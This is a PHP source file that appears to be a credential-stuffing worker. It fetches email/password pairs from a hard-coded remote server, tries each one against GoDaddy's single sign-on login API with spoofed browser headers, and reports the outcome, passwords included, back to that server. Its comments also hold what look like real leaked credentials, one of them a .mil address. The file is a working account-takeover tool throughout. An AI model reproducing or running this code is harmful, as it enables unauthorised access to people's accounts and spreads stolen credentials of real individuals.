
/**
 * Created by PhpStorm.
 * User: kid-dorr
 * Date: 6/6/2017
 * Time: 8:42 AM
 */
//echo "fuck".file_get_contents('https://raw.githubusercontent.com/kid-dorr/php-cloudme-worker/master/godaddy-socket.php');
//$socket = array('bindto' => '208.43.99.88:0');

//$ip = null;
if (isset($socket)) {
    $bindto = $socket['bindto'];
    $ip = substr($bindto, 0, strlen($bindto) - 2);
} else {
    $socket = null;
    $ip = null;
}



// url
$host = "http://173.255.223.13";
$connect_url = "/w/api/v1/workers/connect.php";
$nextmail_url = "/w/api/v1/mails/next.php";
$newresult_url = "/w/api/v1/results/new.php";

$secret = "\$2y\$12\$J1k/vLIWAW13Kg5KGBxpY.tfuaQN2IVJ5QjS27j/UJSCYu0XERzsW";

// connect to cloud
function isConnected($url, $sk = null) {

    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    // add socket
    if ($sk) {
        $opts['socket'] = $sk;
    } else {
        echo "socket null";
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function nextMail($url, $sk = null) {
//    $connect_init = curl_init($url);
//
//    curl_setopt($connect_init, CURLOPT_RETURNTRANSFER, 1);
//    $connect_resp = curl_exec($connect_init);
//
//    $json_resp = json_decode($connect_resp, true);
//    //print_r($json_resp["status"]);
//    curl_close($connect_init);
//    return $json_resp;
//    // get a mailpass to check "Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) ) ";
    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    echo $resp;
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function newResult($url, $query, $sk = null) {
    //$secret = $query['secret'];
    //echo $secret."<br>";

    $lease_id = $query['id'];

    $mail = $query['mail'];

    $pass = $query['pass'];

    $type = $query['type'];

    $result = $query['result'];

    $data = $query['data'];

    $new_result_url = $url."&id=".$lease_id."&mail=".$mail."&pass=".$pass."&type=".$type."&result=".$result."&data=".$data;

    $opts = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Accept-language: en'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($new_result_url, false, $context);
    print_r($resp);
}

function checkGodaddy($mailpass, $ip) {
    echo "check godaddy";
    $mail = $mailpass['mail'];
    $pass = $mailpass['pass'];
    //print_r($mailpass);

    $get_login_url = "https://sso.godaddy.com/?realm=idp&path=%2F&app=mya";
    $post_login_url = "https://sso.godaddy.com/v1/api/login?realm=idp&app=mya&path=/&plid=1&";
    $get_logout_url = "https://sso.godaddy.com/logout?realm=idp&app=mya&path=";

    $login_json = json_encode(
        array(
            'username' => $mail,
            'password' => $pass,
            'remember-me' => 'false',
            'app' => 'mya',
            'API_HOST' => "godaddy.com",
            'path' => "/",
            'plid' => 1,
        )
    );
    echo $login_json;
    // post login
    $post_login_init = curl_init($post_login_url);
    curl_setopt($post_login_init, CURLOPT_POST, 1);
    if ($ip) {
        curl_setopt($post_login_init, CURLOPT_INTERFACE, $ip);
    }
    //
    curl_setopt($post_login_init, CURLOPT_HTTPHEADER, array(
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type: application/json',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.8',
        'Content-Length: '.strlen($login_json)
    ));
    //curl_setopt($post_login_init, CURLOPT_POST, 1);
    curl_setopt($post_login_init, CURLOPT_POSTFIELDS, $login_json);
    curl_setopt($post_login_init, CURLOPT_VERBOSE, true);
    curl_setopt($post_login_init, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($post_login_init, CURLOPT_SSL_VERIFYPEER, false);

//    $resp = curl_exec($post_login_init);
    $post_login_resp = curl_exec($post_login_init);
    $response = curl_getinfo($post_login_init, CURLINFO_HTTP_CODE);
    curl_close($post_login_init);
    //var_dump($response);
    //print_r($post_login_resp);
    $resp = json_decode($post_login_resp);
    //print_r($resp);
    echo "code: ".$resp->code;
    if ($resp->code == 1) {
        echo $resp->code;
        return 1;
    }

    return 0;

}

//$test_mp = array(
//    'mail' => 'giaminchu03',
//    'pass' => 'Satsatsat1@',
//);
//
//checkGodaddy($test_mp, $ip);

$is_connected = isConnected($host.$connect_url."?secret=".$secret, $socket);
if ($is_connected) {
    echo $is_connected['desc'];
    // get mailpass
    $nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1", $socket);
    // Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) )

    if($nextmail_resp['status']) {
        $mailpass = $nextmail_resp['data'];
        $result = checkGodaddy($mailpass, $socket);
        $query = array(	'id' => $mailpass['id'],
            'mail' => $mailpass['mail'],
            'pass' => $mailpass['pass'],
            'type' => $mailpass['types'],
            'result' => $result,
            'data' => '');

        $new_result_url = $host.$newresult_url."?secret=".$secret;
        newResult($new_result_url, $query, $socket);
        echo "update success";
    }

} else {
    echo "connect error";
}

